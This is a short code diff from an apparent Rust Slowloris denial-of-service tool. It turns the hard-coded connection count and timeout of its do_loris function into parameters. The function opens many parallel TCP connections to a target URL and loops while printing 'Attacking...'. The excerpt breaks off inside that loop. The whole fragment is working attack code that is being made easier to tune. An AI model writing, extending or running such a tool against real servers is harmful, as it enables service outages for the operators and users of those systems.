@@ -20,17 +20,14 @@ use std::net::TcpStream;
 use std::time::Duration;
 use std::thread;
 
-pub fn do_loris(url: &str) -> Result<(), LorisError> {
+pub fn do_loris(url: &str, timeout: u64, requests: u64) -> Result<(), LorisError> {
     let url = Url::parse(url)?;
-
-    let connection_num = 1024;
     let init_header = get_init_header(&url);
-    let mut connections: Vec<_> = (0..connection_num)
+    let mut connections: Vec<_> = (0..requests)
         .into_par_iter()
         .map(|_| spawn_connection(&url, &init_header))
         .collect();
 
-    let timeout = 4_500;
     loop {
         println!("Attacking...");
         connections.par_iter_mut().for_each(|connection| {
